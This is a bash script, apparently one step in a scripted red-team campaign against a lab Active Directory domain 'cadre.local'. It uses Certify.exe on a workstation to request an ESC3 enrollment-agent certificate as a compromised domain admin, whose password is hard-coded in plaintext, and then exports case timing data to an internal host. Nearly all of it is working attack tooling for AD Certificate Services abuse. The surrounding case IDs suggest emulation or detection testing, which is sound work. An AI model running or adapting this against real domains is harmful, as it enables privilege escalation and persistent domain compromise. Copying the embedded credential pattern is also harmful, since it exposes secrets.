#!/usr/bin/env bash
# T051 — ADCS ESC3 enrollment agent from ws01 as chief_command (cadre.local DA)
# Entry credential: chief_command (earned via Branch A T015 ForceChangePassword)
set -euo pipefail
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
LIB="${SCRIPT_DIR}/../lib"
source "${LIB}/campaign-a-common.sh"

CASE_ID="CADRE-T051-ESC3-${CASE_DATE:-$(date -u +%Y%m%d)}"
T0=$(date -u +%Y-%m-%dT%H:%M:%SZ)

echo "=== T051 ESC3 | ${CASE_ID} | T0=${T0} ==="

DC01="${DC01:-dc01.cadre.local}"
CA="${CA:-CADRE-CA-01.cadre.local\CADRE-CA-01}"

CMD='
$c = "C:\Tools\cadre-attack\Certify.exe";
if (-not (Test-Path $c)) { throw "Certify.exe not found" }
& $c request /ca:"'''"${CA}"'''" /template:ESC3EnrollmentAgent /domain:"cadre.local" /dc:"'''"${DC01}"'''" /user:chief_command /onbehalfof:CADRE\chief_command;
Write-Output "T051_OK: ESC3 enrollment agent request complete"
'

ws01_exec_as chief_command 'C0mm@nd_Ch1ef!' "$CMD" 'cadre.local'

cadre_export "${CASE_ID}" T051 "${T0}" 192.168.77.62
echo "T0=${T0}" | tee "/tmp/${CASE_ID}.t0"
echo "=== T051 run complete ==="
